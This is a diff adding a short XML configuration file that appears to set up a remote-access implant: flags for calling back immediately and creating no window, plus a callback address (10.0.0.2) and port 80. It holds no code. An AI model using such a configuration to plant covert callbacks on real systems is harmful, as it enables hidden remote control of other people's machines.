@@ -1,0 +1,15 @@
+﻿<?xml version='1.0' encoding='UTF-8' ?>
+<PCConfig>
+  <Flags>
+    <PCHEAP_CONFIG_FLAG_CALLBACK_NOW/>
+    <PCHEAP_CONFIG_FLAG_DONT_CREATE_WINDOW/>
+  </Flags>
+  <Id>0x0</Id>
+  <CallbackAddress>10.0.0.2</CallbackAddress>
+  <CallbackPorts>
+    <CallbackPair>
+      <SrcPort>0</SrcPort>
+      <DstPort>80</DstPort>
+    </CallbackPair>
+  </CallbackPorts>
+</PCConfig>
